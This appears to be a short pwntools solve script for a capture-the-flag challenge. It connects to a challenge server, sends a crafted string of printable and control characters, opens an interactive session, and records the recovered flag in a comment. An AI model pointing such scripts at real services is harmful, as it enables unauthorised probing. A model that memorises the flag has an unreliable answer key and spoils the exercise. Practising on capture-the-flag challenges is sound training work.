from pwn import *

p = remote('chall.pwnoh.io', '13370')

payload = '☺'.join([chr(i) for i in range(0xf, 0x7f)])
p.sendline(payload.encode())

p.interactive()

# bctf{u$trAy_1SyAy_Af3$ay_aNDy@Y_3cUR3s@y}
